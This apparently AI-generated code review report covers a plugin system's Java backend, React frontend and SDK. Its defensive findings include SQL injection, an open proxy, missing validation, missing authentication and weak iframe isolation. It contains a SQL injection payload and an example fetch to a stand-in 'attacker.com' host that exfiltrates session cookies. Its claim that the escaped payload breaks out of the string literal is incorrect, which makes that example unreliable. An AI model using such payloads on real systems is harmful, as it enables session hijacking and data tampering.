# Code Review Report

**Date**: 2026-03-28
**Path**: Plugin system implementation (backend + frontend + SDK + demo)
**Scope**: all (quality, security, performance, best practices)
**Status**: Critical Issues

## Summary
- **Critical**: 2 issues
- **Warnings**: 6 issues
- **Info**: 4 issues

---

## Critical Issues

### C1. SQL Injection via JSONB Filter -- Insufficient Input Validation

**Location**: `src/main/java/pl/devstyle/aj/product/PluginDataSpecification.java:29-78`

**Description**: The `parse()` method only validates the operator against a whitelist (`eq|gt|lt|exists|bool`), but `pluginId`, `jsonPath`, and `value` are not validated against any pattern. The only defense is single-quote escaping (`replace("'", "''")`), which is applied before the values are interpolated into raw SQL via `hcb.sql(sqlFragment, Boolean.class)`.

Single-quote escaping alone is **not sufficient** to prevent SQL injection in all PostgreSQL contexts. While the JSONB arrow operators (`->`, `->>`) expect string keys and the values are within single-quoted literals, an attacker could craft input containing backslash sequences or exploit edge cases in PostgreSQL's string parsing (depending on `standard_conforming_strings` setting). More critically, the `pluginId` and `jsonPath` values flow directly from user-controlled HTTP query parameters (`pluginFilter` in `ProductController`) with zero validation.

**Risk**: An attacker can manipulate the `pluginFilter` query parameter to inject arbitrary SQL. For example: `pluginFilter=x'OR 1=1--:path:eq:val` -- after single-quote escaping this becomes `x''OR 1=1--` which exits the string literal and injects SQL.

**Recommendation**: Use parameterized queries instead of string interpolation. Replace the `hcb.sql()` approach with JPA Criteria API native functions or use `cb.function()` to call PostgreSQL JSONB operators with bind parameters. At minimum, add strict allowlist validation on `pluginId` and `jsonPath` (e.g., `^[a-zA-Z0-9_-]+$`).

**Fixable**: true (replace string interpolation with parameterized approach)

---

### C2. Open Proxy via pluginFetch -- No URL Restriction

**Location**: `src/main/frontend/src/plugins/PluginMessageHandler.ts:42-85`

**Description**: The `handlePluginFetch` function accepts an arbitrary URL from plugin postMessage requests and forwards it via `fetch()` with the host application's full cookie/session context. The only validation is a check for `..` in the URL path. A malicious or compromised plugin can use this to:

1. Make requests to any internal service or localhost endpoint reachable from the host browser.
2. Exfiltrate the host app's session cookies to attacker-controlled URLs (the fetch runs with the host's origin, so all cookies for that origin are attached).
3. Perform SSRF-like attacks against internal APIs.

**Risk**: Full session hijacking and internal network probing. Any plugin iframe can call `hostApp.fetch("https://attacker.com/steal?cookie=...")` or `hostApp.fetch("/api/plugins/some-plugin", { method: "DELETE" })` to perform destructive actions with the authenticated user's session.

**Recommendation**: Restrict allowed URLs to a whitelist (e.g., only the host's own `/api/` endpoints, or only the plugin's own declared URL origin). At minimum, validate that the URL origin matches either the host origin or the requesting plugin's registered URL. Strip cookies from proxied requests using `credentials: "omit"` in the fetch options.

**Fixable**: true (add URL allowlist and `credentials: "omit"`)

---

## Warnings

### W1. No Input Validation on Manifest Upload

**Location**: `src/main/java/pl/devstyle/aj/core/plugin/PluginDescriptorService.java:20-36`

**Description**: The `uploadManifest` method accepts an arbitrary `Map<String, Object>` and extracts fields with unchecked casts (`(String) manifest.get("name")`). There is no validation on:
- Required fields (name, version, url could all be null)
- URL format (the `url` field could contain `javascript:` or other dangerous schemes)
- The `extensionPoints` structure within the manifest
- The `pluginId` path variable (could contain path traversal characters or special chars)

A `ClassCastException` would be thrown if `name` is not a String, but this would surface as a 500 error rather than a meaningful 400 response.

**Recommendation**: Add a typed `ManifestRequest` record with Jakarta Bean Validation annotations (`@NotBlank`, `@Pattern`, `@Valid`). Validate the `pluginId` against `^[a-zA-Z0-9_-]+$`. Validate the URL is `http://` or `https://`.

**Fixable**: true

---

### W2. No Authentication or Authorization on Any Endpoint

**Location**: `src/main/java/pl/devstyle/aj/core/plugin/PluginController.java`, `PluginDataController.java`, `PluginObjectController.java`

**Description**: No Spring Security configuration exists anywhere in the project. All plugin management endpoints (upload manifest, delete plugin, toggle enabled, read/write plugin data, CRUD plugin objects) are publicly accessible without authentication. While this may be acceptable for a pre-alpha scaffold, any deployment beyond local development would expose full administrative control.

**Risk**: Anyone with network access can register malicious plugins, modify product data, or delete plugins.

**Recommendation**: This is noted as a pre-alpha project, so this may be intentional. Document it as a known gap and track it for pre-deployment.

**Fixable**: true (add Spring Security config when ready)

---

### W3. iframe sandbox includes `allow-same-origin` -- Weakened Isolation

**Location**: `src/main/frontend/src/plugins/PluginFrame.tsx:31`

**Description**: The sandbox attribute is `"allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-downloads"`. The combination of `allow-scripts` and `allow-same-origin` effectively neutralizes much of the sandbox's protection. A plugin served from the same origin as the host app would have full access to the host's DOM, cookies, and localStorage. Even for cross-origin plugins, `allow-same-origin` means the plugin retains its full origin capabilities.

The `allow-same-origin` flag is necessary for the plugin to use `postMessage` with origin checking and for the plugin to store its own data in localStorage. This is a well-known trade-off in iframe sandboxing.

**Risk**: If a plugin is ever served from the same origin as the host (e.g., during development behind a reverse proxy), the sandbox provides zero protection.

**Recommendation**: Document this as a security boundary requirement: plugins MUST be served from a different origin than the host application. Consider adding a runtime check in `PluginFrame` that rejects plugin URLs matching the host origin.

**Fixable**: true (add origin check)

---

### W4. PluginDescriptor uses entity ID in equals/hashCode

**Location**: `src/main/java/pl/devstyle/aj/core/plugin/PluginDescriptor.java:62-71`

**Description**: The `equals()` and `hashCode()` methods use `id` (the primary key, which is also the pluginId string). Per the project's JPA entity modeling standards (`.maister/docs/standards/backend/models.md`), entities should use business keys for equality, never the entity ID. In this case, the `id` *is* the business key (user-assigned plugin identifier, not a generated sequence), so this is technically correct but conflates the two concepts. The real concern is that `PluginObject.equals/hashCode` uses `pluginId + objectType + objectId` which is good (business key composite), but this inconsistency in approach should be noted.

**Recommendation**: This is acceptable since `PluginDescriptor.id` is a user-assigned business identifier, not a generated surrogate key. Add a comment to clarify this deviation from the standard pattern.

**Fixable**: false (design decision, not a bug)

---

### W5. Response Listener Does Not Validate Origin

**Location**: `src/main/frontend/src/plugin-sdk/messaging.ts:87-93`

**Description**: The `installResponseListener` listens for `message` events globally and routes any message with a `responseId` property to the pending promise map. It does not validate `event.origin` to confirm the response came from the expected host. A malicious parent frame or sibling iframe could spoof responses to pending requests.

**Risk**: In the plugin SDK (running inside the plugin iframe), any window that can `postMessage` to the plugin's iframe could resolve pending promises with attacker-controlled data.

**Recommendation**: Store the `hostOrigin` and validate `event.origin === hostOrigin` in the response listener before processing.

**Fixable**: true

---

### W6. Missing Error Handling in Demo Plugin

**Location**: `plugins/warehouse/src/pages/WarehousePage.tsx:40-48`, `plugins/warehouse/src/pages/ProductStockTab.tsx:38-46`

**Description**: `handleAdd` and `handleDelete` in `WarehousePage.tsx` do not catch errors -- if the SDK call fails, the promise rejection is unhandled (the `void` prefix suppresses the lint warning but the error is silently swallowed at runtime). Similarly, `handleSave` in `ProductStockTab.tsx` has no error feedback to the user.

**Recommendation**: Add try/catch with user-visible error state for all SDK calls in the demo plugin.

**Fixable**: true

---

## Informational

### I1. Magic Numbers in Frontend Styles

**Location**: Multiple frontend page files (e.g., `ProductDetailPage.tsx:98-105`, `PluginDetailPage.tsx`, `PluginListPage.tsx`)

**Description**: Numerous hardcoded hex color values (`#0F172A`, `#64748B`, `#E2E8F0`, `#0D9488`, etc.) and pixel sizes are used inline rather than through Chakra UI's theme tokens. While these appear to be from a consistent design palette, they bypass the theming system.

**Recommendation**: Extract to Chakra UI theme tokens for consistency and maintainability. This is a low-priority improvement.

**Fixable**: true

---

### I2. Unchecked Type Casts in PluginResponse.from()

**Location**: `src/main/java/pl/devstyle/aj/core/plugin/PluginResponse.java:21-24`

**Description**: The manifest's `extensionPoints` value is cast to `List<Map<String, Object>>` via double-cast through `List<?>`. If the stored JSON has an unexpected structure (e.g., `extensionPoints` is a string), this will throw a `ClassCastException` at serialization time rather than at the cast line, making debugging harder.

**Recommendation**: Add defensive type checking or use Jackson's `ObjectMapper.convertValue()` for safe conversion.

**Fixable**: true

---

### I3. SDK Message Types Not Fully Implemented

**Location**: `src/main/frontend/src/plugins/PluginMessageHandler.ts:137-139`

**Description**: The comment at line 137 lists nine message types (`getProducts`, `getProduct`, `getPlugins`, `getData`, `setData`, `removeData`, `objectsList`, `objectsGet`, `objectsSave`, `objectsDelete`) as planned but not yet implemented. The SDK facades (`host-app.ts`, `this-plugin.ts`) expose these methods, but calls to them will always result in `"Unknown message type"` errors from the host handler.

**Recommendation**: This is expected for a pre-alpha scaffold. Ensure the demo plugin documentation notes which SDK methods are functional vs. stubbed.

**Fixable**: false (expected incomplete state)

---

### I4. Module-Level Singleton State in iframeRegistry and messaging.ts

**Location**: `src/main/frontend/src/plugins/iframeRegistry.ts:6`, `src/main/frontend/src/plugin-sdk/messaging.ts:10`

**Description**: Both `iframeRegistry` and the `pending` map in `messaging.ts` use module-level mutable state (singletons). This is standard for browser-side code but makes unit testing more complex (requires careful setup/teardown) and would break if the code were ever used in SSR contexts.

**Recommendation**: No action needed for current use case. If testing becomes difficult, consider dependency injection or a factory pattern.

**Fixable**: false (acceptable pattern for browser code)

---

## Metrics

| Metric | Value |
|--------|-------|
| Files analyzed | 28 |
| Max function length | ~30 lines (`toPredicate` in PluginDataSpecification) |
| Max nesting depth | 3 levels |
| Potential SQL injection vulnerabilities | 1 (PluginDataSpecification) |
| Open proxy risk | 1 (pluginFetch handler) |
| Missing input validation | 2 (manifest upload, pluginFilter) |
| Missing authentication | All endpoints |
| N+1 query risks | 0 |

---

## Prioritized Recommendations

1. **[Critical]** Replace string interpolation in `PluginDataSpecification.toPredicate()` with parameterized queries to eliminate SQL injection risk. Add strict `^[a-zA-Z0-9_.-]+$` validation on `pluginId` and `jsonPath` in `parse()`.

2. **[Critical]** Restrict `handlePluginFetch` to only allow requests to the host's own API endpoints (prefix check against `window.location.origin + "/api/"`) or the plugin's registered URL origin. Add `credentials: "omit"` to prevent session cookie leakage.

3. **[Warning]** Add origin validation in the plugin SDK's response listener (`messaging.ts:installResponseListener`) to prevent response spoofing.

4. **[Warning]** Add typed request validation with Jakarta Bean Validation on the manifest upload endpoint. Validate `pluginId` format and URL scheme.

5. **[Warning]** Add a runtime check in `PluginFrame` to reject plugin URLs that share the same origin as the host application, documenting this as a security boundary requirement.

6. **[Warning]** Add error handling (try/catch with user feedback) to all async SDK calls in the demo warehouse plugin.
